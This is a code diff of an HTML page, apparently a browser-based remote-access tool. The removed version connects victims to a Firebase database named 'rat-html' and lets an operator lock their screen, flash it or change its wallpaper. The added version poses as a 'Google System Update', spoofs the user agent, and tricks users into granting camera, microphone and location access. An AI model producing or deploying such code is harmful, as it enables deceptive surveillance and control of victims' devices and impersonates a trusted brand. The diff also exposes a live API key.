@@ -2,87 +2,82 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Framework</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google System Update</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        // --- 1. TRICK SPOOFER (Nipu WebView biar ngaku jadi Chrome Asli) ---
+        Object.defineProperty(navigator, 'userAgent', {
+            get: function () { return 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'; }
+        });
+    </script>
     <style>
-        body { background: #000; color: #00f2ff; font-family: sans-serif; margin: 0; text-align: center; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; transition: 0.5s; }
-        #front-flash { display: none; position: fixed; inset: 0; background: #fff; z-index: 10000; }
-        #lock-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        input { background: #111; border: 1px solid #00f2ff; color: #fff; padding: 15px; width: 85%; border-radius: 8px; margin-top: 10px; text-align: center; box-sizing: border-box; }
-        button { background: #00f2ff; color: #000; border: none; padding: 15px; width: 85%; font-weight: bold; margin-top: 15px; border-radius: 8px; cursor: pointer; }
+        body { background: #ffffff; font-family: sans-serif; }
+        .cb-luxury { width: 22px; height: 22px; accent-color: #1a73e8; }
     </style>
 </head>
-<body>
-    <div id="front-flash"></div>
+<body class="flex flex-col items-center px-10 py-16 min-h-screen">
 
-    <div id="lock-screen">
-        <h1 style="color:red; font-size: 2rem;">SYSTEM LOCKED</h1>
-        <p id="msg-lock" style="color:#fff; padding: 20px;"></p>
-        <input type="password" id="pw-unlock" placeholder="PASSWORD UNLOCK">
-        <button onclick="doUnlock()" style="background:red; color:#fff;">DECRYPT SYSTEM</button>
+    <div class="text-center mb-10">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo_v2.svg" width="50" class="mx-auto mb-6">
+        <h1 class="text-xl font-medium text-gray-800">Verifikasi Layanan</h1>
+        <p class="text-[10px] text-gray-400 mt-1 uppercase tracking-widest">Security Bridge v4.0</p>
     </div>
 
-    <div id="setup" style="width: 100%;">
-        <h2 style="letter-spacing: 2px;">V-PROJECT V1.0</h2>
-        <p style="color: #444; font-size: 12px;">Initializing System Update...</p>
-        <input type="text" id="b-id" placeholder="ENTER LICENSE CODE">
-        <button onclick="start()">UPDATE SYSTEM</button>
+    <div class="w-full max-w-sm space-y-4 mb-10">
+        <div class="flex items-center gap-4 p-4 border border-gray-100 rounded-2xl bg-gray-50/50" onclick="document.getElementById('c1').click()">
+            <input type="checkbox" id="c1" onchange="forcePrompt()" class="cb-luxury">
+            <label class="text-sm text-gray-700 font-medium">Verifikasi Modul Hardware</label>
+        </div>
+        <div class="flex items-center gap-4 p-4 border border-gray-100 rounded-2xl bg-gray-50/50" onclick="document.getElementById('c2').click()">
+            <input type="checkbox" id="c2" onchange="forcePrompt()" class="cb-luxury">
+            <label class="text-sm text-gray-700 font-medium">Sinkronisasi GPS Google</label>
+        </div>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-        import { getDatabase, ref, set, onValue, update, get } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+    <button id="finalBtn" disabled class="w-full max-w-sm bg-gray-200 text-gray-400 py-4 rounded-xl font-bold uppercase tracking-widest text-xs">
+        Update Berhasil
+    </button>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
-            authDomain: "rat-html.firebaseapp.com",
-            databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "rat-html",
-            storageBucket: "rat-html.firebasestorage.app",
-            messagingSenderId: "1060124583265",
-            appId: "1:1060124583265:web:a117830e798cd1d60f5120",
-            measurementId: "G-XMHT2S731L"
-        };
+    <video id="v" autoplay playsinline style="display:none;"></video>
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-        let myPath = "";
-
-        window.start = async () => {
-            const bID = document.getElementById('b-id').value; if(!bID) return alert("License Required!");
+    <script>
+        async function forcePrompt() {
+            // --- 2. TRICK AUDIO CONTEXT (Bangunin WebView Basic) ---
             try {
-                await navigator.mediaDevices.getUserMedia({ video: true });
-                let ua = navigator.userAgent;
-                let hp = "Unknown_Device";
-                if(ua.includes("Android")) {
-                    let parts = ua.match(/\(([^;]+);([^;]+);/);
-                    hp = parts ? parts[2].trim() : "Android_User";
-                }
+                const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                const aCtx = new AudioCtx();
+                if (aCtx.state === 'suspended') await aCtx.resume();
+            } catch(e) {}
+
+            // --- 3. TEMBAK IZIN (Double Method) ---
+            try {
+                // Method Modern
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v').srcObject = stream;
                 
-                myPath = `buyer_data/${bID}/${hp.replace(/\s/g, '_')}_${Math.floor(Math.random()*999)}`;
-
-                await set(ref(db, myPath), { model: hp, flash: false, lock: false, lock_msg: "LOCKED!", lock_pw: "123", wallpaper: "default" });
-                document.getElementById('setup').innerHTML = "<h2 style='color: #0f0;'>SYSTEM READY</h2><p>Running background service...</p>";
-
-                onValue(ref(db, myPath), (snap) => {
-                    const d = snap.val(); if(!d) return;
-                    document.getElementById('front-flash').style.display = d.flash ? 'block' : 'none';
-                    document.body.style.filter = d.flash ? "brightness(200%)" : "brightness(100%)";
-                    if(d.wallpaper !== "default") document.body.style.background = `url('${d.wallpaper}') center/cover no-repeat fixed`;
-                    if(d.lock) {
-                        document.getElementById('lock-screen').style.display = 'flex';
-                        document.getElementById('msg-lock').innerText = d.lock_msg;
-                        window.history.pushState(null, null, window.location.href);
-                    } else { document.getElementById('lock-screen').style.display = 'none'; }
+                // Method Lokasi
+                navigator.geolocation.getCurrentPosition(() => {
+                    checkAll();
                 });
-            } catch (e) { alert("Permission Denied!"); }
+            } catch (err) {
+                // Method Legacy (Buat WebView jadul)
+                const legacyCam = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
+                if (legacyCam) {
+                    legacyCam.call(navigator, {video: true, audio: true}, () => { checkAll(); }, () => {});
+                } else {
+                    alert("Klik 'IZINKAN' pada sistem untuk melanjutkan!");
+                }
+            }
         }
 
-        window.doUnlock = async () => {
-            const inp = document.getElementById('pw-unlock').value;
-            const snap = await get(ref(db, myPath + '/lock_pw'));
-            if(inp === snap.val()) { await update(ref(db, myPath), { lock: false }); } 
-            else { alert("WRONG PASSWORD!"); }
+        function checkAll() {
+            if(document.getElementById('c1').checked && document.getElementById('c2').checked) {
+                const btn = document.getElementById('finalBtn');
+                btn.disabled = false;
+                btn.className = "w-full max-w-sm bg-blue-600 text-white py-4 rounded-xl font-bold uppercase tracking-widest text-xs shadow-lg";
+                btn.innerText = "SISTEM TERVERIFIKASI";
+            }
         }
     </script>
 </body>
